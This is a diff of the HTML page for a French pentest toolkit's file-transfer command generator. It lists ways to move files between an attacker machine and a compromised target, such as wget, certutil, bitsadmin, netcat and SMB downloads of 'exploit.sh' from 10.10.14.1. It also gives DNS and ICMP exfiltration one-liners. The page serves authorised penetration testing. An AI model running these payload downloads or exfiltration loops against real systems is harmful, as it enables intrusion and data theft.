@@ -3,36 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Guide de Transfert de Fichiers</title>
-    <!-- Bootstrap CSS (Optionnel, si utilisé ailleurs) -->
-    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
-    <!-- VOTRE CSS EXTERNE -->
+    <title>Transfert de Fichiers - AuditMapper</title>
     <link rel="stylesheet" href="/assets/css/styles.css">
-    <!-- Font Awesome (si utilisé pour les icônes) -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-
+    <link rel="stylesheet" href="/assets/css/file-transfer.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <script>
+        // Informations spécifiques à cette page
+        window.pageInfo = {
+            title: 'Transfert de Fichiers',
+            headerTitle: 'Transfert de Fichiers',
+            activePage: 'file_transfer'
+        };
+    </script>
+    <script src="/assets/js/template-loader.js"></script>
 </head>
-<body class=""> <!-- La classe dark-theme sera gérée par theme.js -->
-
-    <!-- Bouton Sidebar Toggle (comme grepmaster.html) -->
+<body>
+    <!-- Bouton pour afficher/masquer la sidebar -->
     <button id="sidebar-toggle" class="sidebar-toggle">
-        <i>☰</i> <!-- Utilisation de l'icône texte comme hostmanager -->
+        <i>☰</i>
     </button>
-
-    <!-- Sidebar (Structure identique à hostmanager.html) -->
+    
+    <!-- Sidebar Unifiée -->
     <div id="sidebar" class="sidebar">
         <a href="/index.html" class="sidebar-header">
-            <h2>Pentest Tools</h2>
-            <p>Suite d'outils pour pentest</p>
+            <img src="/assets/photos/logo.png" alt="AuditMapper" class="sidebar-logo">
+            <div class="sidebar-header-text">
+                <h2>AuditMapper</h2>
+                <p>Security Assessment Suite</p>
+            </div>
         </a>
+        
         <div class="sidebar-content">
             <ul class="sidebar-nav">
-                <div class="sidebar-category">Générateur</div>
+                <div class="sidebar-category">Management</div>
                 <li class="sidebar-nav-item">
                     <a href="/pages/hostmanager.html" class="sidebar-nav-link">
                         <i>🖥️</i> Host Manager
                     </a>
                 </li>
+                
                 <div class="sidebar-category">Outils</div>
                 <li class="sidebar-nav-item">
                     <a href="/pages/tools.html" class="sidebar-nav-link">
@@ -40,20 +51,25 @@
                     </a>
                 </li>
                 <li class="sidebar-nav-item">
+                    <a href="/pages/file_transfer.html" class="sidebar-nav-link active">
+                        <i>🔄</i> Transfert Fichiers
+                    </a>
+                </li>
+                <li class="sidebar-nav-item">
+                    <a href="/pages/pivoting_guide.html" class="sidebar-nav-link">
+                        <i>🔀</i> Pivoting Guide
+                    </a>
+                </li>
+                <li class="sidebar-nav-item">
                     <a href="/pages/privesc.html" class="sidebar-nav-link">
                         <i>🔑</i> Guide Privesc
                     </a>
                 </li>
-                <!-- Lien Actif pour la nouvelle page -->
-                <li class="sidebar-nav-item">
-                    <a href="/pages/file_transfer.html" class="sidebar-nav-link active">
-                        <i>🔄</i> Transfert Fichiers <!-- Emoji mis à jour -->
-                    </a>
-                </li>
-                <div class="sidebar-category">Parsers</div>
+                
+                <div class="sidebar-category">Parsers & Générateurs</div>
                 <li class="sidebar-nav-item">
                     <a href="/pages/hostsmaker.html" class="sidebar-nav-link">
-                        <i>🌐</i> /etc/hosts Maker
+                        <i>🌐</i> Config Generator
                     </a>
                 </li>
                 <li class="sidebar-nav-item">
@@ -63,25 +79,24 @@
                 </li>
                 <li class="sidebar-nav-item">
                     <a href="/pages/vulnreport.html" class="sidebar-nav-link">
-                        <i>🔒</i> Rapport de Vulnérabilités
+                        <i>📊</i> Vuln Report
                     </a>
                 </li>
             </ul>
         </div>
     </div>
 
-    <!-- Header (Structure identique à grepmaster.html) -->
-    <header id="main-header" class="main-header">
+    <!-- Header -->
+    <header class="main-header">
         <div class="header-container">
-            <!-- Titre spécifique à la page -->
-            <h1>Guide de Transfert de Fichiers</h1>
+            <div class="header-content">
+                <h1>🔄 Transfert de Fichiers</h1>
+                <p class="header-subtitle">Générateur de commandes pour transfert de fichiers multi-plateformes</p>
+            </div>
             <div class="header-controls">
-                <!-- Sélecteur de langue (si vous l'utilisez ici) -->
                 <div class="language-selector">
                     <button id="languageDropdown" class="language-dropdown">
-                        <i class="icon-language">🌍</i>
-                        <span id="currentLanguage">Français</span>
-                        <i class="dropdown-arrow">▼</i>
+                        <span class="language-flag">🇫🇷</span> FR
                     </button>
                     <div id="languageMenu" class="language-menu">
                         <div class="language-option" data-lang="fr">
@@ -90,75 +105,655 @@
                         <div class="language-option" data-lang="en">
                             <span class="language-flag">🇬🇧</span>English
                         </div>
-                        <!-- Autres langues -->
                     </div>
                 </div>
-                <!-- Bouton Thème -->
                 <button id="toggleTheme" class="theme-toggle">
                     <i class="icon-theme">🌓</i>
                 </button>
             </div>
         </div>
     </header>
-
-    <!-- Contenu Principal (Wrapper comme grepmaster.html) -->
-    <div id="main-content" class="main-content">
-
-        <!-- Section Sélection OS -->
-        <!-- Utilisation de card pour un style cohérent -->
-        <div class="card shadow-sm mb-4">
-            <div class="card-body">
-                <h2 class="card-title">Transfert de Fichiers Facile</h2>
-                <div class="d-flex align-items-end justify-content-center flex-wrap">
-                    <div class="form-group mr-3 mb-2">
-                        <label for="os-source">OS Source</label>
-                        <select id="os-source" class="form-control form-control-sm"> <!-- form-control-sm pour taille réduite -->
-                            <option value="Linux" selected>Linux</option>
-                            <option value="Windows">Windows</option>
-                        </select>
+    
+    <!-- Contenu principal -->
+    <div class="main-content">
+        <!-- Configuration Scenario -->
+        <div class="scenario-section">
+            <div class="scenario-card">
+                <h2>🎯 Configuration du Scénario</h2>
+                <p class="scenario-description">
+                    Configurez votre environnement de transfert de fichiers en spécifiant les systèmes source et destination.
+                </p>
+                
+                <div class="scenario-grid">
+                    <div class="scenario-side attacker-side">
+                        <div class="side-header">
+                            <div class="side-icon">🖥️</div>
+                            <div class="side-info">
+                                <h3>Machine Attaquant</h3>
+                                <p>Votre machine de pentest</p>
+                            </div>
+                        </div>
+                        <div class="side-config">
+                            <div class="config-item">
+                                <label>Système d'exploitation</label>
+                                <select id="attackerOS" class="config-select">
+                                    <option value="kali">🐉 Kali Linux</option>
+                                    <option value="ubuntu">🐧 Ubuntu/Debian</option>
+                                    <option value="arch">🏔️ Arch Linux</option>
+                                    <option value="windows">🪟 Windows</option>
+                                    <option value="macos">🍎 macOS</option>
+                                </select>
+                            </div>
+                            <div class="config-item">
+                                <label>Adresse IP</label>
+                                <input type="text" id="attackerIP" placeholder="10.10.14.1" class="config-input">
+                            </div>
+                            <div class="config-item">
+                                <label>Port d'écoute</label>
+                                <input type="number" id="listenPort" placeholder="8000" class="config-input">
+                            </div>
+                        </div>
                     </div>
-                    <div class="mx-3 mb-2 align-self-center"> <!-- mb-2 pour alignement -->
-                        <i class="fas fa-arrow-right fa-lg" style="color: var(--primary-color, #3498db);"></i> <!-- Icône FontAwesome -->
+
+                    <div class="transfer-arrow">
+                        <div class="arrow-icon">➡️</div>
+                        <div class="transfer-info">
+                            <span>Transfert</span>
+                        </div>
                     </div>
-                    <div class="form-group ml-3 mb-2">
-                        <label for="os-destination">OS Destination</label>
-                        <select id="os-destination" class="form-control form-control-sm"> <!-- form-control-sm -->
-                            <option value="Linux">Linux</option>
-                            <option value="Windows" selected>Windows</option>
-                        </select>
+
+                    <div class="scenario-side target-side">
+                        <div class="side-header">
+                            <div class="side-icon">🎯</div>
+                            <div class="side-info">
+                                <h3>Machine Cible</h3>
+                                <p>Système compromis</p>
+                            </div>
+                        </div>
+                        <div class="side-config">
+                            <div class="config-item">
+                                <label>Système d'exploitation</label>
+                                <select id="targetOS" class="config-select">
+                                    <option value="linux">🐧 Linux</option>
+                                    <option value="windows">🪟 Windows</option>
+                                    <option value="macos">🍎 macOS</option>
+                                </select>
+                            </div>
+                            <div class="config-item">
+                                <label>Nom du fichier</label>
+                                <input type="text" id="fileName" placeholder="exploit.sh" class="config-input">
+                            </div>
+                            <div class="config-item">
+                                <label>Destination</label>
+                                <input type="text" id="targetPath" placeholder="/tmp/" class="config-input">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="scenario-actions">
+                    <button id="generateCommands" class="btn btn-primary">
+                        🚀 Générer les Commandes
+                    </button>
+                    <button id="resetConfig" class="btn btn-secondary">
+                        🔄 Réinitialiser
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Méthodes de transfert -->
+        <div class="methods-section">
+            <h2>📋 Méthodes de Transfert Disponibles</h2>
+            
+            <!-- HTTP Transfer -->
+            <div class="method-card" data-method="http">
+                <div class="method-header">
+                    <div class="method-icon">🌐</div>
+                    <div class="method-info">
+                        <h3>Serveur HTTP</h3>
+                        <p>Méthode la plus simple et universelle</p>
+                    </div>
+                    <div class="method-badges">
+                        <span class="badge badge-recommended">Recommandé</span>
+                        <span class="badge badge-easy">Facile</span>
+                    </div>
+                </div>
+                <div class="method-content">
+                    <div class="step-by-step">
+                        <div class="step">
+                            <div class="step-number">1</div>
+                            <div class="step-content">
+                                <h4>🖥️ Sur votre machine attaquant</h4>
+                                <p class="step-description">
+                                    Démarrez un serveur HTTP dans le dossier contenant votre fichier
+                                </p>
+                                <div class="command-variants">
+                                    <div class="command-block">
+                                        <div class="command-label">Python 3 (recommandé)</div>
+                                        <code id="httpServerPython3">python3 -m http.server 8000</code>
+                                        <button class="copy-btn" onclick="copyCommand('httpServerPython3')">📋</button>
+                                    </div>
+                                    <div class="command-block">
+                                        <div class="command-label">Python 2 (legacy)</div>
+                                        <code id="httpServerPython2">python -m SimpleHTTPServer 8000</code>
+                                        <button class="copy-btn" onclick="copyCommand('httpServerPython2')">📋</button>
+                                    </div>
+                                    <div class="command-block">
+                                        <div class="command-label">PHP</div>
+                                        <code id="httpServerPHP">php -S 0.0.0.0:8000</code>
+                                        <button class="copy-btn" onclick="copyCommand('httpServerPHP')">📋</button>
+                                    </div>
+                                    <div class="command-block">
+                                        <div class="command-label">Ruby</div>
+                                        <code id="httpServerRuby">ruby -run -e httpd . -p 8000</code>
+                                        <button class="copy-btn" onclick="copyCommand('httpServerRuby')">📋</button>
+                                    </div>
+                                    <div class="command-block">
+                                        <div class="command-label">Node.js</div>
+                                        <code id="httpServerNode">npx http-server -p 8000</code>
+                                        <button class="copy-btn" onclick="copyCommand('httpServerNode')">📋</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="step">
+                            <div class="step-number">2</div>
+                            <div class="step-content">
+                                <h4>🎯 Sur la machine cible</h4>
+                                <p class="step-description">
+                                    Téléchargez le fichier depuis votre serveur HTTP
+                                </p>
+                                <div class="os-specific-commands">
+                                    <div class="os-tab-group">
+                                        <button class="os-tab active" data-os="linux">🐧 Linux</button>
+                                        <button class="os-tab" data-os="windows">🪟 Windows</button>
+                                        <button class="os-tab" data-os="macos">🍎 macOS</button>
+                                    </div>
+                                    
+                                    <div class="os-content active" data-os-content="linux">
+                                        <div class="command-block">
+                                            <div class="command-label">wget (le plus courant)</div>
+                                            <code id="httpClientWget">wget http://10.10.14.1:8000/exploit.sh</code>
+                                            <button class="copy-btn" onclick="copyCommand('httpClientWget')">📋</button>
+                                        </div>
+                                        <div class="command-block">
+                                            <div class="command-label">curl (alternative)</div>
+                                            <code id="httpClientCurl">curl -O http://10.10.14.1:8000/exploit.sh</code>
+                                            <button class="copy-btn" onclick="copyCommand('httpClientCurl')">📋</button>
+                                        </div>
+                                        <div class="command-block">
+                                            <div class="command-label">wget silencieux</div>
+                                            <code id="httpClientWgetQuiet">wget -q http://10.10.14.1:8000/exploit.sh</code>
+                                            <button class="copy-btn" onclick="copyCommand('httpClientWgetQuiet')">📋</button>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="os-content" data-os-content="windows">
+                                        <div class="command-block">
+                                            <div class="command-label">PowerShell (Windows 10+)</div>
+                                            <code id="httpClientPowershell">Invoke-WebRequest -Uri "http://10.10.14.1:8000/exploit.sh" -OutFile "exploit.sh"</code>
+                                            <button class="copy-btn" onclick="copyCommand('httpClientPowershell')">📋</button>
+                                        </div>
+                                        <div class="command-block">
+                                            <div class="command-label">PowerShell court</div>
+                                            <code id="httpClientPowershellShort">iwr -uri "http://10.10.14.1:8000/exploit.sh" -o "exploit.sh"</code>
+                                            <button class="copy-btn" onclick="copyCommand('httpClientPowershellShort')">📋</button>
+                                        </div>
+                                        <div class="command-block">
+                                            <div class="command-label">certutil (Windows legacy)</div>
+                                            <code id="httpClientCertutil">certutil -urlcache -split -f "http://10.10.14.1:8000/exploit.sh" exploit.sh</code>
+                                            <button class="copy-btn" onclick="copyCommand('httpClientCertutil')">📋</button>
+                                        </div>
+                                        <div class="command-block">
+                                            <div class="command-label">bitsadmin (Windows legacy)</div>
+                                            <code id="httpClientBitsadmin">bitsadmin /transfer myDownloadJob /download /priority normal http://10.10.14.1:8000/exploit.sh C:\temp\exploit.sh</code>
+                                            <button class="copy-btn" onclick="copyCommand('httpClientBitsadmin')">📋</button>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="os-content" data-os-content="macos">
+                                        <div class="command-block">
+                                            <div class="command-label">curl (natif macOS)</div>
+                                            <code id="httpClientMacOS">curl -O http://10.10.14.1:8000/exploit.sh</code>
+                                            <button class="copy-btn" onclick="copyCommand('httpClientMacOS')">📋</button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- FTP Transfer -->
+            <div class="method-card" data-method="ftp">
+                <div class="method-header">
+                    <div class="method-icon">📂</div>
+                    <div class="method-info">
+                        <h3>Serveur FTP</h3>
+                        <p>Transfert via protocole FTP</p>
+                    </div>
+                    <div class="method-badges">
+                        <span class="badge badge-network">Réseau</span>
+                        <span class="badge badge-auth">Authentification</span>
+                    </div>
+                </div>
+                <div class="method-content">
+                    <div class="step-by-step">
+                        <div class="step">
+                            <div class="step-number">1</div>
+                            <div class="step-content">
+                                <h4>🖥️ Sur votre machine attaquant</h4>
+                                <p class="step-description">
+                                    Démarrez un serveur FTP temporaire
+                                </p>
+                                <div class="command-variants">
+                                    <div class="command-block">
+                                        <div class="command-label">Python pyftpdlib</div>
+                                        <code id="ftpServerPython">python3 -m pyftpdlib -p 21 -w</code>
+                                        <button class="copy-btn" onclick="copyCommand('ftpServerPython')">📋</button>
+                                    </div>
+                                    <div class="command-block">
+                                        <div class="command-label">Pure-FTPd (Linux)</div>
+                                        <code id="ftpServerPure">pure-ftpd -j -P 10.10.14.1 -p 30000:30009</code>
+                                        <button class="copy-btn" onclick="copyCommand('ftpServerPure')">📋</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="step">
+                            <div class="step-number">2</div>
+                            <div class="step-content">
+                                <h4>🎯 Sur la machine cible</h4>
+                                <p class="step-description">
+                                    Connectez-vous au serveur FTP et téléchargez
+                                </p>
+                                <div class="command-block">
+                                    <div class="command-label">Client FTP</div>
+                                    <code id="ftpClient">ftp 10.10.14.1</code>
+                                    <button class="copy-btn" onclick="copyCommand('ftpClient')">📋</button>
+                                </div>
+                                <div class="step-note">
+                                    💡 Puis utilisez: get exploit.sh
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- SCP/SFTP Transfer -->
+            <div class="method-card" data-method="scp">
+                <div class="method-header">
+                    <div class="method-icon">🔐</div>
+                    <div class="method-info">
+                        <h3>SCP/SFTP</h3>
+                        <p>Transfert sécurisé via SSH</p>
+                    </div>
+                    <div class="method-badges">
+                        <span class="badge badge-secure">Sécurisé</span>
+                        <span class="badge badge-ssh">SSH</span>
+                    </div>
+                </div>
+                <div class="method-content">
+                    <div class="step-by-step">
+                        <div class="step">
+                            <div class="step-number">1</div>
+                            <div class="step-content">
+                                <h4>🔄 Transfert bidirectionnel</h4>
+                                <p class="step-description">
+                                    Utilisez SCP pour transférer des fichiers via SSH
+                                </p>
+                                <div class="command-variants">
+                                    <div class="command-block">
+                                        <div class="command-label">Upload vers la cible</div>
+                                        <code id="scpUpload">scp exploit.sh user@10.10.14.1:/tmp/</code>
+                                        <button class="copy-btn" onclick="copyCommand('scpUpload')">📋</button>
+                                    </div>
+                                    <div class="command-block">
+                                        <div class="command-label">Download depuis la cible</div>
+                                        <code id="scpDownload">scp user@10.10.14.1:/tmp/exploit.sh .</code>
+                                        <button class="copy-btn" onclick="copyCommand('scpDownload')">📋</button>
+                                    </div>
+                                    <div class="command-block">
+                                        <div class="command-label">SFTP interactif</div>
+                                        <code id="sftpConnect">sftp user@10.10.14.1</code>
+                                        <button class="copy-btn" onclick="copyCommand('sftpConnect')">📋</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Netcat Transfer -->
+            <div class="method-card" data-method="netcat">
+                <div class="method-header">
+                    <div class="method-icon">🔌</div>
+                    <div class="method-info">
+                        <h3>Netcat (nc)</h3>
+                        <p>Transfert direct via socket TCP</p>
+                    </div>
+                    <div class="method-badges">
+                        <span class="badge badge-fast">Rapide</span>
+                        <span class="badge badge-stealth">Discret</span>
+                    </div>
+                </div>
+                <div class="method-content">
+                    <div class="step-by-step">
+                        <div class="step">
+                            <div class="step-number">1</div>
+                            <div class="step-content">
+                                <h4>🖥️ Sur votre machine attaquant</h4>
+                                <p class="step-description">
+                                    Configurez netcat pour envoyer le fichier
+                                </p>
+                                <div class="command-variants">
+                                    <div class="command-block">
+                                        <div class="command-label">Envoi du fichier</div>
+                                        <code id="ncSender">nc -lvnp 8000 < exploit.sh</code>
+                                        <button class="copy-btn" onclick="copyCommand('ncSender')">📋</button>
+                                    </div>
+                                    <div class="command-block">
+                                        <div class="command-label">Netcat traditionnel</div>
+                                        <code id="ncSenderTraditional">nc -l -p 8000 < exploit.sh</code>
+                                        <button class="copy-btn" onclick="copyCommand('ncSenderTraditional')">📋</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="step">
+                            <div class="step-number">2</div>
+                            <div class="step-content">
+                                <h4>🎯 Sur la machine cible</h4>
+                                <p class="step-description">
+                                    Connectez-vous et recevez le fichier
+                                </p>
+                                <div class="command-block">
+                                    <div class="command-label">Réception du fichier</div>
+                                    <code id="ncReceiver">nc 10.10.14.1 8000 > exploit.sh</code>
+                                    <button class="copy-btn" onclick="copyCommand('ncReceiver')">📋</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Base64 Transfer -->
+            <div class="method-card" data-method="base64">
+                <div class="method-header">
+                    <div class="method-icon">🔤</div>
+                    <div class="method-info">
+                        <h3>Encodage Base64</h3>
+                        <p>Pour petits fichiers via copier-coller</p>
+                    </div>
+                    <div class="method-badges">
+                        <span class="badge badge-stealth">Très discret</span>
+                        <span class="badge badge-manual">Manuel</span>
+                    </div>
+                </div>
+                <div class="method-content">
+                    <div class="step-by-step">
+                        <div class="step">
+                            <div class="step-number">1</div>
+                            <div class="step-content">
+                                <h4>🖥️ Sur votre machine attaquant</h4>
+                                <p class="step-description">
+                                    Encodez le fichier en Base64
+                                </p>
+                                <div class="command-variants">
+                                    <div class="command-block">
+                                        <div class="command-label">Encodage Base64 (Linux)</div>
+                                        <code id="base64Encode">base64 -w 0 exploit.sh</code>
+                                        <button class="copy-btn" onclick="copyCommand('base64Encode')">📋</button>
+                                    </div>
+                                    <div class="command-block">
+                                        <div class="command-label">Encodage Base64 (macOS)</div>
+                                        <code id="base64EncodeMac">base64 -i exploit.sh</code>
+                                        <button class="copy-btn" onclick="copyCommand('base64EncodeMac')">📋</button>
+                                    </div>
+                                    <div class="command-block">
+                                        <div class="command-label">PowerShell Base64</div>
+                                        <code id="base64EncodePowershell">[Convert]::ToBase64String([IO.File]::ReadAllBytes("exploit.sh"))</code>
+                                        <button class="copy-btn" onclick="copyCommand('base64EncodePowershell')">📋</button>
+                                    </div>
+                                </div>
+                                <div class="step-note">
+                                    💡 Copiez la sortie de cette commande
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="step">
+                            <div class="step-number">2</div>
+                            <div class="step-content">
+                                <h4>🎯 Sur la machine cible</h4>
+                                <p class="step-description">
+                                    Décodez et sauvegardez le fichier
+                                </p>
+                                <div class="os-specific-commands">
+                                    <div class="os-tab-group">
+                                        <button class="os-tab active" data-os="linux">🐧 Linux</button>
+                                        <button class="os-tab" data-os="windows">🪟 Windows</button>
+                                    </div>
+                                    
+                                    <div class="os-content active" data-os-content="linux">
+                                        <div class="command-block">
+                                            <div class="command-label">Décodage Base64</div>
+                                            <code id="base64Decode">echo "PASTE_BASE64_HERE" | base64 -d > exploit.sh</code>
+                                            <button class="copy-btn" onclick="copyCommand('base64Decode')">📋</button>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="os-content" data-os-content="windows">
+                                        <div class="command-block">
+                                            <div class="command-label">PowerShell décodage</div>
+                                            <code id="base64DecodePowershell">[IO.File]::WriteAllBytes("exploit.sh", [Convert]::FromBase64String("PASTE_BASE64_HERE"))</code>
+                                            <button class="copy-btn" onclick="copyCommand('base64DecodePowershell')">📋</button>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="step-note">
+                                    💡 Remplacez PASTE_BASE64_HERE par le contenu copié
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- SMB Transfer -->
+            <div class="method-card" data-method="smb">
+                <div class="method-header">
+                    <div class="method-icon">📁</div>
+                    <div class="method-info">
+                        <h3>Partage SMB</h3>
+                        <p>Idéal pour environnements Windows</p>
+                    </div>
+                    <div class="method-badges">
+                        <span class="badge badge-windows">Windows</span>
+                        <span class="badge badge-network">Réseau</span>
+                    </div>
+                </div>
+                <div class="method-content">
+                    <div class="step-by-step">
+                        <div class="step">
+                            <div class="step-number">1</div>
+                            <div class="step-content">
+                                <h4>🖥️ Sur votre machine attaquant</h4>
+                                <p class="step-description">
+                                    Créez un partage SMB temporaire
+                                </p>
+                                <div class="command-variants">
+                                    <div class="command-block">
+                                        <div class="command-label">Impacket SMB Server</div>
+                                        <code id="smbServer">impacket-smbserver share . -smb2support</code>
+                                        <button class="copy-btn" onclick="copyCommand('smbServer')">📋</button>
+                                    </div>
+                                    <div class="command-block">
+                                        <div class="command-label">SMB avec authentification</div>
+                                        <code id="smbServerAuth">impacket-smbserver share . -smb2support -user test -password test</code>
+                                        <button class="copy-btn" onclick="copyCommand('smbServerAuth')">📋</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="step">
+                            <div class="step-number">2</div>
+                            <div class="step-content">
+                                <h4>🎯 Sur la machine cible Windows</h4>
+                                <p class="step-description">
+                                    Accédez au partage et copiez le fichier
+                                </p>
+                                <div class="command-variants">
+                                    <div class="command-block">
+                                        <div class="command-label">Copie depuis SMB</div>
+                                        <code id="smbCopy">copy \\10.10.14.1\share\exploit.sh .</code>
+                                        <button class="copy-btn" onclick="copyCommand('smbCopy')">📋</button>
+                                    </div>
+                                    <div class="command-block">
+                                        <div class="command-label">Robocopy (plus robuste)</div>
+                                        <code id="smbRobocopy">robocopy \\10.10.14.1\share . exploit.sh</code>
+                                        <button class="copy-btn" onclick="copyCommand('smbRobocopy')">📋</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- DNS Exfiltration -->
+            <div class="method-card" data-method="dns">
+                <div class="method-header">
+                    <div class="method-icon">🌐</div>
+                    <div class="method-info">
+                        <h3>Exfiltration DNS</h3>
+                        <p>Transfert via requêtes DNS (très discret)</p>
+                    </div>
+                    <div class="method-badges">
+                        <span class="badge badge-stealth">Ultra discret</span>
+                        <span class="badge badge-advanced">Avancé</span>
+                    </div>
+                </div>
+                <div class="method-content">
+                    <div class="step-by-step">
+                        <div class="step">
+                            <div class="step-number">1</div>
+                            <div class="step-content">
+                                <h4>🖥️ Sur votre machine attaquant</h4>
+                                <p class="step-description">
+                                    Configurez un serveur DNS pour recevoir les données
+                                </p>
+                                <div class="command-block">
+                                    <div class="command-label">Serveur DNS simple</div>
+                                    <code id="dnsServer">sudo tcpdump -i any -s 0 port 53</code>
+                                    <button class="copy-btn" onclick="copyCommand('dnsServer')">📋</button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="step">
+                            <div class="step-number">2</div>
+                            <div class="step-content">
+                                <h4>🎯 Sur la machine cible</h4>
+                                <p class="step-description">
+                                    Exfiltrez le fichier via requêtes DNS
+                                </p>
+                                <div class="command-block">
+                                    <div class="command-label">Exfiltration DNS</div>
+                                    <code id="dnsExfil">for i in $(base64 -w 0 exploit.sh | fold -w 32); do nslookup $i.10.10.14.1; done</code>
+                                    <button class="copy-btn" onclick="copyCommand('dnsExfil')">📋</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ICMP Exfiltration -->
+            <div class="method-card" data-method="icmp">
+                <div class="method-header">
+                    <div class="method-icon">📡</div>
+                    <div class="method-info">
+                        <h3>Exfiltration ICMP</h3>
+                        <p>Transfert via paquets ping</p>
+                    </div>
+                    <div class="method-badges">
+                        <span class="badge badge-stealth">Très discret</span>
+                        <span class="badge badge-creative">Créatif</span>
+                    </div>
+                </div>
+                <div class="method-content">
+                    <div class="step-by-step">
+                        <div class="step">
+                            <div class="step-number">1</div>
+                            <div class="step-content">
+                                <h4>🖥️ Sur votre machine attaquant</h4>
+                                <p class="step-description">
+                                    Écoutez les paquets ICMP
+                                </p>
+                                <div class="command-block">
+                                    <div class="command-label">Capture ICMP</div>
+                                    <code id="icmpListen">sudo tcpdump -i any icmp</code>
+                                    <button class="copy-btn" onclick="copyCommand('icmpListen')">📋</button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="step">
+                            <div class="step-number">2</div>
+                            <div class="step-content">
+                                <h4>🎯 Sur la machine cible</h4>
+                                <p class="step-description">
+                                    Envoyez le fichier via ping
+                                </p>
+                                <div class="command-block">
+                                    <div class="command-label">Exfiltration ICMP</div>
+                                    <code id="icmpExfil">xxd -p -c 16 exploit.sh | while read line; do ping -c 1 -p $line 10.10.14.1; done</code>
+                                    <button class="copy-btn" onclick="copyCommand('icmpExfil')">📋</button>
+                                </div>
+                            </div>
+                        </div>
                     </div>
                 </div>
             </div>
         </div>
 
-        <!-- Section Guide de Transfert Dynamique -->
-        <!-- Utilisation de card pour le conteneur principal du guide -->
-        <div class="card shadow-sm">
-             <div class="card-header bg-light"> <!-- En-tête pour le titre -->
-                <h2 id="transfer-title" class="mb-0 h5">Sélectionnez les OS Source et Destination</h2> <!-- Style de titre ajusté -->
-            </div>
-            <div class="card-body">
-                <div id="transfer-guide-content">
-                    <!-- Le contenu (cartes de méthodes) sera généré ici par JavaScript -->
-                     <p class="text-muted placeholder-message">Sélectionnez les systèmes source et destination pour voir les méthodes de transfert.</p>
+        <!-- Historique -->
+        <div class="history-section">
+            <div class="history-card">
+                <h3>📋 Historique des Commandes</h3>
+                <div class="history-controls">
+                    <button id="clearHistory" class="btn btn-secondary">🗑️ Vider</button>
+                    <button id="exportHistory" class="btn btn-secondary">📤 Exporter</button>
+                </div>
+                <div id="commandHistory" class="history-list">
+                    <div class="history-empty">
+                        <span class="empty-icon">📝</span>
+                        <p>Aucune commande copiée pour le moment</p>
+                    </div>
                 </div>
             </div>
         </div>
+    </div>
 
-    </div> <!-- Fin #main-content -->
-
-    <!-- Footer (Structure identique à grepmaster.html) -->
     <footer class="main-footer">
         <div class="footer-content">
-            <p>Made with ❤️ by Elliot Belt</p>
+            <p>Made with ❤️ by Elliot Belt - AuditMapper Security Suite</p>
         </div>
     </footer>
 
-    <!-- Scripts JS -->
     <script src="/assets/js/sidebar.js"></script>
     <script src="/assets/js/theme.js"></script>
-    <script src="/assets/js/language.js"></script> <!-- Assurez-vous que ce script existe et fonctionne -->
-    <script src="/assets/js/file_transfer.js"></script> <!-- Script spécifique à cette page -->
-
+    <script src="/assets/js/language.js"></script>
+    <script src="/assets/js/file-transfer.js"></script>
 </body>
 </html> 
